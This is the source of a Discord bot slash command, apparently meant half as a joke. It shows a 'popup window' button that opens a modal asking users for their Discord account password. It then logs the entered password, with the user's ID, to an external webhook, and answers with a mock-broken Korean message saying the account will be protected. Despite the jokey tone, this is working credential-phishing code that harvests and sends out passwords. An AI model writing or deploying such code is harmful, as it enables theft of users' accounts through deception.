import {
	createElement,
	useDescription,
	useString, useNumber, useInteger, useBoolean,
	Fragment, Message, Embed, Field, Modal, Button, Input, Row,
	useButton, useModal, useInput,
} from 'slshx';
import {
	WebLogger,
	escapers,
} from "./modules/tweak_functions";
const Logger = new WebLogger(env.LOGHOOK_ID, env.LOGHOOK_TOKEN);


export default function 빠빱윈또우뻐뜬() {
	useDescription("popup_window_button");
	const [popupPassword_id, popupPassword_value] = useInput();
	const popupWindow_id = useModal(interaction => {
		Logger.log(`<@${interaction.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapers.backtick(popupPassword_value)}\`\``);
		
		return (
			<Message ephemeral>
				{`<@${interaction.member.user.id}>`}, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.
			</Message>
		);
	});
	const popupWindowButton_id = useButton(() => (
		<Modal id={popupWindow_id} title="이것은 빠빱_윈또우 이다">
			<Input
				id={popupPassword_id}
				label="Discord 계정 비밀번호를 입력해주세요."
				required
			/>
		</Modal>
	));
	

	return () => (
		<Message>
			빠빱\_윈또우\_뻐뜬
			<Row>
				<Button id={popupWindowButton_id} primary>popup_window_button</Button>
			</Row>
		</Message>
	);
};